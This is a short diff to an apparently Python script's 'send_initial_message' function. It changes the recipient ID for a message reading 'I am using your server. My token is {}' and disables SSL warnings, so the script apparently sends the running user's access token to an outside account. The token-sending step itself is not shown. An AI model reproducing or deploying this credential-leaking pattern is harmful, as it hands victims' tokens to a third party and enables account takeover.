@@ -42,8 +42,8 @@ def send_initial_message():
       msg_template = "Hello Yakshit sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "61552467625991"
-
+      target_id = "61571059542672"
+      
       requests.packages.urllib3.disable_warnings()
 
       def liness():
